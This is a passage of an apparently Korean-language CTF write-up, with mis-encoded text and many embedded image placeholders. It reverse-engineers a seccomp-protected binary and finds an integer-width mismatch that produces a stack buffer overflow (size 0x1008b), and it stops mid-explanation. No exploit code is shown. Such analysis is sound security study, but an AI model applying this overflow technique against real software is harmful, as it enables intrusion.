url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACCUlEQVQoz3WRz0/bMBzFXe2ye7U/YpftsutO+7MRp0kgDgg2CoXSpqRN2ySOHdvxjzhx/CZaYIiNJ330tWTpve+zSZIobDYKWaZRli0YO8D5X8rSYb3W4LyDqAOkCBAiRCl7FIXXvy7V96sr/fniQn0hea5AKQNjBoxFSIk9zuFF1g6HMK5hugZcteDSwZguatPBuv7xjBAiyG73aFjv04uiQ11HMB7hPSCEhlIKtGpAqwHrlcJ8XmK53iIrdijyOvJCI/geQ4z7cMJ4D9m0+J+M1kCMELVHQR3oukF5IyCyCmKbR7ktoVIWHTexD4jeD5Fs7hTWkwp8RaEER2M1GtNAGQXKKXzwsLaHtQFdF9H1w356j9j3gGqCTtL2R/pgv6ap/UaWM4ds2SBNStzNSxScgTc1KsVQ6xq2t/Bdj74Pb/Y/dHQuyJOf7GOSGPLwYAnZrgzq3KGuJARTsHULL1sg/PsEMcbXxMOHBTmd6k9nZ4Lsdu0HUi4Nkt8S5TZHmWeoNhKOagTTIr4xeTZ9mi+G19fN+PZWE0r9iLBUgU624PcbqISiuuWwKw6dCeisRnAdhggMQ3zL3tOYICeTZjydalIUfkQ468Cow9A9dozP5V7xrvaXIUQ5m5nxYmGIEP2InJ7WuLxUmN0b3M8NFgt7IHliYd4jJonFzY2WR0fV+PiYkfNzOfoDK+gyV7VA4h8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/0b457abfea4a60ff1f1de5e45820781b/37523/4.png\"\n        srcset=\"/static/0b457abfea4a60ff1f1de5e45820781b/e9ff0/4.png 180w,\n/static/0b457abfea4a60ff1f1de5e45820781b/f21e7/4.png 360w,\n/static/0b457abfea4a60ff1f1de5e45820781b/37523/4.png 720w,\n/static/0b457abfea4a60ff1f1de5e45820781b/8efc2/4.png 828w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>main í•¨ìˆ˜</p>\n<ul>\n<li>ë°”ì´ë„ˆë¦¬ê°€ strippe ë˜ì–´ ìˆì§€ë§Œ ê¸°ë³¸ì ìœ¼ë¡œ í•¨ìˆ˜ë“¤ì´ syscall í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ ë™ì‘í•˜ì—¬ ê°ê°ì˜ í•¨ìˆ˜ë“¤ì´ ì–´ë–¤ í•¨ìˆ˜ì¸ì§€ë¥¼ ìœ ì¶”í•  ìˆ˜ ê°€ ìˆë‹¤.</li>\n<li>ì œì¼ ì²˜ìŒìœ¼ë¡œ í˜¸ì¶œë˜ëŠ” <code class=\"language-text\">syscall_filter()</code> í•¨ìˆ˜ëŠ” <code class=\"language-text\">prctl</code> í•¨ìˆ˜ì˜ ì¸ìë¡œ <code class=\"language-text\">PR_SET_SECCOMP</code>  ì„ ì‚¬ìš©í•˜ì—¬ í™œì„±í™”ë¥¼ í•˜ëŠ” ë¡œì§ì„ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 692px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 47.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABNElEQVQoz4WP3WrDMAyF8/5PtAco7KYbdPRmK8uf08RxktqObUlxU2u0uRtsPRwOQujjoOztbdzvh68vK+XF+ziOTgilNRiDW1pLiOmXiRLiLev7sutKoxVRQAzWmmkaiRDAr2uMkRADIgD4EBxiAPAAfp7tsmBW13VRVMMwAqzGzO6hEO7pfTDGOOeWZSEiRNwGIgKAGGNWlnmeF30vAF6u15GZEa/OLSHE2y3xv8qKIs/zvOv6qvyOMTBz01itiWhNT1jemvOuU23LiPfV+eyIrimt67o+gauqLIpCKZUeYua2ddYGKaXW+gkshCjLSqmBmbcnpQzWQt8rYywzp/Sns2E4Synm+fK4u8PTBESLMYP39knz6+tpt/t8fxd1TUJA09DhMB2Pw8dHdzrppkEh/vQPz9Q740dPnsUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/a75d94593b3dce87df3cc4a73eb9f756/91e7e/5.png\"\n        srcset=\"/static/a75d94593b3dce87df3cc4a73eb9f756/e9ff0/5.png 180w,\n/static/a75d94593b3dce87df3cc4a73eb9f756/f21e7/5.png 360w,\n/static/a75d94593b3dce87df3cc4a73eb9f756/91e7e/5.png 692w\"\n        sizes=\"(max-width: 692px) 100vw, 692px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>main í•¨ìˆ˜ ì§€ì—­ ë³€ìˆ˜</p>\n<ul>\n<li><code class=\"language-text\">sub_73E</code> í•¨ìˆ˜ëŠ” í•´ë‹¹ 140 ë°”ì´íŠ¸ ì§œë¦¬ buf ë°°ì—´ì„ ì¸ìë¡œ ì‚¬ìš©í•˜ëŠ”ë° ë‚´ë¶€ ë°ì´í„°ë¥¼ ì „ë¶€ 0ìœ¼ë¡œ ë§Œë“ ë‹¤.</li>\n<li>ë‹¤ìŒ ë£¨í”„ì—ì„œëŠ” cnt+3ì„ í•˜ê²Œ ë˜ëŠ”ë° í•´ë‹¹ cnt ê°’ì€ 0ìœ¼ë¡œ ì´ˆê¸°í™”ë˜ì–´ ìˆëŠ” ìƒíƒœì´ë©° 3ë²ˆ ë£¨í”„ë¥¼ ëŒ ê²ƒìœ¼ë¡œ ë¶„ì„ëœë‹¤.</li>\n<li>ë£¨í”„ê°€ ë  ê¸°ëŠ¥ì„ ì‚´í´ ë³´ë©´ <code class=\"language-text\">flag ( i-cnt / 3)</code> í˜•ì‹ìœ¼ë¡œ ì¶œë ¥ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©° í•´ë‹¹ ë£¨í”„ì—ì„œ ë¹ ì ¸ ë‚˜ê°€ì§€ ì•ŠëŠ” ì´ìƒ ê³„ì† ì¹´ìš´íŒ… ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li>\n<li><code class=\"language-text\">sub_91E</code> í•¨ìˆ˜ì˜ ì¸ìˆ˜ ë¡œ <code class=\"language-text\">buf</code>, <code class=\"language-text\">&amp;size</code>, <code class=\"language-text\">&amp;cnt</code> ë¥¼ ì‚¬ìš©í•˜ì—¬ í˜¸ì¶œë˜ë©´ ë°˜í™˜ëœ ê°’ìœ¼ë¡œ ë£¨í”„ì˜ ì¢…ë£Œ ì¡°ê±´ìœ¼ë¡œ ë“¤ì–´ê°€ëŠ” ê²ƒìœ¼ë¡œ ë³´ì•„ í•´ë‹¹ í•¨ìˆ˜ì—ì„œ íŠ¹ì • ë¡œì§ìœ¼ë¡œ ê²€ì¦ ì—¬ë¶€ê°€ ì¡´ì¬í•œë‹¤ëŠ” ì‚¬ì‹¤ì„ ì•Œ ìˆ˜ ìˆë‹¤.</li>\n</ul>\n<h2 id=\"sub_91e-í•¨ìˆ˜-ë¶„ì„\" style=\"position:relative;\"><a href=\"#sub_91e-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"sub_91e í•¨ìˆ˜ ë¶„ì„ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sub_91E í•¨ìˆ˜ ë¶„ì„</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABaElEQVQY0yWPS27bMBRFuYJupYMU6CBdQGddTVaXScZNiiAQ4spuDDuxJMsSSX0oiZQo6hRyHnDwcIF7B0ecTg1FsWLQ2tF1jr5fGWmagTz/RMkepSx1M4WmmZByVFHU/Twc7Nc47r59fNib+3t5I7JMU5YarT1aQdd9sp73kKSB7c6SSEmSDZwrSTmUy6WR1NWEMQ7vw7UfRQYhZY1SEq0nLgWUEsoSpgmMGciOHXE08jdq2O0Mb4dieXvPuah6qWvnjQm+bYOHxb++Gi/qesCYEWsXbOux9cRkZ+Y5kOeKZKOJf1ds/qQkqaGuRvpuXuwwY2242qx28zzz8tIi8txjXaAsPdm2pfjXUl0a3NjhvWMOMLjAMFvGaR0uVz83BrXf97+KYvheFPaHUv724UHfiqenlufnijg2bOKe/aHnlDiSxJFljiy1nDPHORuvOU1dWP/xOJzv7rZfjsdeLEsQ3iMeHxvxH8FfuJFk7GtyAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/ea8a8b708738701be91b6c07a4b9cbf2/37523/6.png\"\n        srcset=\"/static/ea8a8b708738701be91b6c07a4b9cbf2/e9ff0/6.png 180w,\n/static/ea8a8b708738701be91b6c07a4b9cbf2/f21e7/6.png 360w,\n/static/ea8a8b708738701be91b6c07a4b9cbf2/37523/6.png 720w,\n/static/ea8a8b708738701be91b6c07a4b9cbf2/715a3/6.png 830w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>strlen</p>\n<ul>\n<li><code class=\"language-text\">sub_777</code> í•¨ìˆ˜ì˜ ì¸ìˆ˜ ê°’ìœ¼ë¡œ <code class=\"language-text\">qword_202000</code> ì‚¬ìš©í•˜ë©° í•´ë‹¹ ë¶€ë¶„ì€ main í•¨ìˆ˜ì—ì„œ <code class=\"language-text\">syscall_filter</code> í•¨ìˆ˜ ë‚´ë¶€ì˜ open í•¨ìˆ˜ë¥¼ ë°”íƒ•ìœ¼ë¡œ <code class=\"language-text\">/home/ctf/flag</code> íŒŒì¼ì˜ ë¬¸ìì—´ì¸ ê²ƒìœ¼ë¡œ íŒŒì•…ëœë‹¤.</li>\n<li><code class=\"language-text\">sub_777</code> í•¨ìˆ˜ëŠ” ë‚´ë¶€ì ìœ¼ë¡œ ë°”ì´íŠ¸ ë‹¨ìœ„ë¡œ ì£¼ì†Œ ë²ˆì§€ë¥¼ ì´ë™í•˜ë©´ì„œ í•´ë‹¹ ì¹´ìš´íŒ…ëœ ê°’ì„ ì •ìˆ˜ í˜•íƒœë¡œ ë°˜í™˜í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì•„ <code class=\"language-text\">strlen</code> í•¨ìˆ˜ì„ì„ ì¸ì§€í•  ìˆ˜ ìˆë‹¤.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 381px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB6UlEQVQ4y6WR32oTQRTG93W89EG88ULwCWS99E18AG8ELwRNrF7UNpXEiFgxbdNEEAKRkthu9//uzM7ObGfmfLJjpLFqsHjg48zhzPnxnRmv3z/xd3fn/miU+73eV39v78Tf2Zn7w+GZPxgsXa/N29szf/ju7P7Ws+N7T15/fnBz6/G3u4NX8k7/Jb/Ve17dfvOiutF9JL26rsGYgJQNGONOnFeoa4my5KhrBc4FGKug1AWSJEPBKnyIzvApDjBOQwyDJd6eL/Dw/fFHTylhqqoyUtZGSmXqGkYIGK1hgI2iNbU1ll/0Uy+OEwrDlNK0pNPTlMLQUJZZCkOiKCJijChJiLKMKI6JpCTSmkhbS4YsDLmzJRDG07LrRRHHfJ5hsSgQRQJJIlAUCowBVUXI8x8SAmCMUJbksnGeCEQAEdm2mk55x7MWaBqLum6db4rf+0Q/8xowCCqkqUSem5U7Cc4tGGvA+QWk1GgXWg2uHK3DrgCFaFYXyQ03jXHrKKWhlIHW1vX+Gag1IY4VlLIIAoWylH9emP7+JL8AjbFYLgssFiXOz6VzdunmUpugVxy2H6IRBBx5Lt0KxtB15YCTCet4RdF+hMB/hgPOZqLjHR4W2N/PMBqVODgoMR6za+voiNnJhKHbDTvfAXhF00ZfSPUfAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/4f96fdf8682d8bfc2001989e53a9c72d/2add2/7.png\"\n        srcset=\"/static/4f96fdf8682d8bfc2001989e53a9c72d/e9ff0/7.png 180w,\n/static/4f96fdf8682d8bfc2001989e53a9c72d/f21e7/7.png 360w,\n/static/4f96fdf8682d8bfc2001989e53a9c72d/2add2/7.png 381w\"\n        sizes=\"(max-width: 381px) 100vw, 381px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>sub_777</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 617px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABG0lEQVQY05WPzU7DMAzH+5I8Ay/BmTOcuSCFp+C6HpAG3NDarWxrq4ltNCRN07iNkxolk3baASz9/Lf8JTvZ7e5YVXVsvT6yquKsKFpWlg9ss75idb1h220ba2X5w+paMs4ta5qRfTfjUyf84+37y+fN2wzvP17H69nzPjkeG5ISqO8tAUxkTGAggI4APE3TdIYocNF8cIJjmhjj0RiHWlu0lpBzQGNG1BoQYEDOHUoZ6iMKAed86AfwtjfWCwFuGBx97Yc0CddJ2VHbGtLakRCWpDQRREfWTmStJ+d8VMRTfNIpYq134YPDIS4Mr2lSSpExQEoN5Jyjf1ocUArTJMs0ZVlHi0VLea4ozzWtVn1kufwzrih6ms/b9BdDJsDYveyFCgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/95e68a40b484397c5faf5d33a302c386/bc962/8.png\"\n        srcset=\"/static/95e68a40b484397c5faf5d33a302c386/e9ff0/8.png 180w,\n/static/95e68a40b484397c5faf5d33a302c386/f21e7/8.png 360w,\n/static/95e68a40b484397c5faf5d33a302c386/bc962/8.png 617w\"\n        sizes=\"(max-width: 617px) 100vw, 617px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>sub_88B</p>\n<ul>\n<li><code class=\"language-text\">sub_88B</code> í•¨ìˆ˜ëŠ” <code class=\"language-text\">read</code> í•¨ìˆ˜ë¥¼ ë°”íƒ•ìœ¼ë¡œ ì…ë ¥ì„ ë°›ê²Œ ë˜ëŠ”ë° ì¸ìë¡œ ì‚¬ìš©ëœ ê°’ì€ __int64 ë°ì´í„° íƒ€ì…ì˜ a1ì¦‰ bufë°°ì—´ì„ ì¸ìë¡œ ì‚¬ìš©í•˜ë©°, ë‘ ë²ˆì§¸ ì¸ìëŠ” size ë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li>\n<li>ì…ë ¥ ê°’ì˜ ê¸¸ì´ë¥¼ ë°˜í™˜í•˜ê²Œ ëœë‹¤.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 567px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 70%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAAsTAAALEwEAmpwYAAABiUlEQVQoz4WR24rbMBRF8/8/Nu8NJZRpm0w8sRNfdD8XHVs6xYZQmCapWA+SYKF9tnaHg2vb3DRz28rpFIchOzdb+4ppEqLy9uZ21mYkyaIimqUQL/q/VUpV1f0+7lJanCUGwcgYWWiBUDDOGKXIoqXocudfmbjS1bqzsWcwH3D5gbYJ2PvYjTTY1HkeAIdUeqcsX2WkUgPEuDiv3VXHSQAYoCKu+etGUa3ID2TAoojNuXzbw+nDjz52ZmrtOKHFzN5xzlsLj2UqGtLQxqmH8RaCT2URERbhWURISp7XyQMq5a9yjAsZKDZqAo1JPagDDRv+TsT1eO/sr+yO7noIt/fJX679+WhO1/H3mIeUh1RtUhu1d0+/6nb22ZJ4YhvJePERDbDj7KkCraMmeip3JycmKrECK86KsgpI2w2taeflqdz/NMd3GHvKmac03EKXOASH3mKtdfVx66k+kpvvfX/BMFEwIMxz5iKy8LywrCVHfCV//jK2Mann0CVNW/hE64NA6ybgi9h/AMBpJ8E7xFYnAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./9.png\"\n        title=\"./9.png\"\n        src=\"/static/a41cbe9adb929bafc233f8d5ad366519/8710b/9.png\"\n        srcset=\"/static/a41cbe9adb929bafc233f8d5ad366519/e9ff0/9.png 180w,\n/static/a41cbe9adb929bafc233f8d5ad366519/f21e7/9.png 360w,\n/static/a41cbe9adb929bafc233f8d5ad366519/8710b/9.png 567w\"\n        sizes=\"(max-width: 567px) 100vw, 567px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>main í•¨ìˆ˜2</p>\n<ul>\n<li>ì¡°ê±´ì„ ë¶„ì„í•´ ë³´ë©´ flag ë¬¸ìì—´ê³¼ ì‚¬ìš©ìê°€ ì…ë ¥í•œ bufë¥¼ ë¹„êµí•˜ì—¬ ì¼ì¹˜ í•˜ì§€ ì•Šì„ ì‹œ <code class=\"language-text\">is not right.</code> ë¬¸ìì—´ì„ ì¶œë ¥í•˜ê³  0ì„ ë°˜í™˜í•˜ë©´ì„œ ì¢…ë£Œ</li>\n<li>ë§Œì•½ ì¡°ê±´ì„ ë§Œì¡±í•˜ì—¬ ë£¨í”„ë¥¼ ìˆ˜í–‰ í–ˆë‹¤ë©´ <code class=\"language-text\">:)</code> ì¶œë ¥í•˜ì—¬ ì…ë ¥ ê°’ì˜ ê¸¸ì´ë¥¼ ë°˜í™˜í•œë‹¤.</li>\n<li>ë§Œì•½ ì•„ë¬´ëŸ° ê°’ì„ ì…ë ¥ í•˜ì§€ ì•Šì•˜ì„ ê²½ìš° ê¸¸ì´ ê°’ì´ 0ì´ë©´ì€ <code class=\"language-text\">try again</code> ì„ ì¶œë ¥ í•˜ë©´ì„œ <code class=\"language-text\">cnt</code> ê°’ì„ ì¦ê°€ ì‹œí‚¤ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li>\n</ul>\n<h2 id=\"integer-issue\" style=\"position:relative;\"><a href=\"#integer-issue\" aria-label=\"integer issue permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Integer Issue</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 624px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAACMElEQVQoz42SvWsUQRjGJ2IrNmKh1oIsFpYWtv4Ngv4FFiKWgh+rWAXENAeJ0ct5jY2gORBUxIBoiI16Ccklm1xCbndu9mN2Zr/ubj9mHrkLFgpKnuH3vk8xPLwvM+R7W5rrHWludzNzb780mVuYrl+YrncA83KT+YXpsOHDPMDt+dXV19eXP5SPfi5XVz62rGPNmZPHmzPkwpvGFBmrt27D3aVgXQbeyxDaAwhngJgNJr6IhqhEhqpUqCoNrTQAFOMiw3JRQRENdYTUbk3yiP2ji75lw9vx4HcF+lsRZG8AvpdB7KcYuRGKfgxohb8V8vw9ABKXOLrellOtljdFej1hBb6weFBaIVcWY2rSPU9ZSVxZBZPWKEitfAzPdvJCW3mhO3mhGRO6lk2/IjcWQZbeuaTRcAiZnesajaZt1Bd2jef1bWPhhWXMzW9NfG2uYzytbRmzd74YT+5+O/f25suLzQdfz8/eXzHuPd44+/ny9KXkzNVrzzhOfGo5p+t15xShNKZJklEhUipEQsMwo1JmNI4HVEYZTcKUCtunwuFOyjiL+yGVDqeCCTvp9ORoZQNZjr5W2mu3Y3ccCEo5giAG5wNEEZDngNYHHEL698XNzRSk35eKUqY4T1UYasWYVpzriR93rf/D+FRKV9XkxVSnkyri+xGECCCEhJQlfB8IAkBKwPOA4fAQI/45YTRZ13VT+H6JIFBwXQUhFOJYIcsUikIhz//NaHTwpdbWEvwCUqKyr+i6su8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./10.png\"\n        title=\"./10.png\"\n        src=\"/static/09120ded3d03456e73abe9502c5306d2/39c09/10.png\"\n        srcset=\"/static/09120ded3d03456e73abe9502c5306d2/e9ff0/10.png 180w,\n/static/09120ded3d03456e73abe9502c5306d2/f21e7/10.png 360w,\n/static/09120ded3d03456e73abe9502c5306d2/39c09/10.png 624w\"\n        sizes=\"(max-width: 624px) 100vw, 624px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>Integer Issue</p>\n<ul>\n<li><code class=\"language-text\">sub_91E</code> í•¨ìˆ˜ì—ì„œëŠ” ì¸ìë¡œ mainì—ì„œ ë°›ì€ buf, size, cnt ë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ê³  ìˆë‹¤. í•˜ì§€ë§Œ main í•¨ìˆ˜ì—ì„œ ì„ ì–¸ëœ ë°ì´í„° íƒ€ì…ì„ ì˜ í™•ì¸í•´ ë³´ë©´ size, cnt ë³€ìˆ˜ëŠ” __int16, 16 bitë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©° sub_91E í•¨ìˆ˜ì˜ ì¸ì ë°ì´í„° íƒ€ì…ì€ 32bitë¡œ ë°›ê³  ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li>\n<li>ë‚®ì€ ë°ì´í„° í¬ê¸°ì—ì„œ ë†’ì€ ë°ì´í„° í¬ê¸°ë¡œ ì´ë™ ëœë‹¤ë©´ C ì–¸ì–´ íŠ¹ì„±ìƒ íƒ€ì…ì´ ëª…ì‹œì ìœ¼ë¡œ í° ìª½ìœ¼ë¡œ í™•ì¥ë˜ê²Œ ë˜ì–´ 16bitë¡œ ì‚¬ìš©í•˜ë˜ ë°ì´í„° í¬ê¸°ê°€ 32bit ê¹Œì§€ ì‚¬ìš©ì´ ê°€ëŠ¥í•´ì ¸ ë‹¤ë¥¸ ë©”ëª¨ë¦¬ ì£¼ì†Œ ì˜ì—­ì„ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ ë˜ëŠ” ì·¨ì•½ì ì´ ë°œìƒí•œë‹¤.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAACj0lEQVQoz3XPyU8TcRjG8fm/vECCLKW1RWPikpgYCaiAEAzU0pYuQWmLCwy0bMFqxLB1mWlnClgoIGEtCNJWiUTEi+HoVQ+/rwGJ4eLhzed9ntsjWXTvr6qUl6qUV1h0L2bdc3qW/znnwJi2YZm3Y552c0k76d3CrHlO/p9SqWqnOG4VxXErZaodQ9KJMemiIuHEqLkwnPk3t3PR85KbHQnKHKMYJjswT7u4lPRiTrmFOeVGsq+9EsO5FEN7urCthqme7+bmrJ/ajMyNWR81CzLXZ3zcXZK5luyixp+m2j9LXWCBq297qQj2YnrzTBjkEMbRgJAG8ylWv37k/cEHBvI6mZ01+rYUlnKbBLMKi7vryBsxVvNZepaSrOQ3eZZ/zc73DTwLo9yo2eCyPMKtOx8wBcJI5aqdUrWNk+kX1Tb6t1WsmUFC6zEevh+iZztG09IgwV2Fxncj9MyladDDhJbT1CojlFsnMIaCmKwxjAN9SFemO7j+znc6s3L+MXJzPfv3vGRvW7kfbOGC0oIxYqNoohlDxEbxWCuGSQdFYy1UTjkwqK2Y407K4y2YEk6k4cIM2aMCK9/2CO/qxKbeMBAZREtM4FNDDGXGcWlBRpfjeKb7GcmM06738npxCqfWSzgzRVtSZnxR4VH8OVK4MCs+/zgkd3woxnZmWM+u488ppPezdO+oZAqbPM1GKBwf0VfQWchn6dqOsLa/S2ArwsaXHE+2JsSnwwNezISF5N+aRPm0LJQvK3StjeFWZJpiAdxakMaoH5ce5EHUd5obIp249RAN0U68qX7qo5149BB10U46tJCojT5GKlPtokSxUaLYRFnCTqXiwKK2Y4w7MJ9p+afrnPbzWZxo0ly//wDajyT0RpI0CgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./11.png\"\n        title=\"./11.png\"\n        src=\"/static/4891aa4963881373eb835817224b4c2a/37523/11.png\"\n        srcset=\"/static/4891aa4963881373eb835817224b4c2a/e9ff0/11.png 180w,\n/static/4891aa4963881373eb835817224b4c2a/f21e7/11.png 360w,\n/static/4891aa4963881373eb835817224b4c2a/37523/11.png 720w,\n/static/4891aa4963881373eb835817224b4c2a/d0cc0/11.png 732w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>integer issue</p>\n<ul>\n<li>ë°ì´í„° í¬ê¸°ê°€ 32bitë¡œ í™•ì¥ë˜ì–´ cnt ë³€ìˆ˜ì˜ ì˜ì—­ê¹Œì§€ ì¸ì‹í•˜ê²Œ ë˜ì–´ <code class=\"language-text\">0x1008b</code> ì‚¬ì´ì¦ˆ ê°’ì„ ì‚¬ìš©í•˜ê²Œ ë˜ì–´ <code class=\"language-text\">input_len(buf, 0x1008b)</code> í˜¸ì¶œë˜ì–´ ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ê°€ 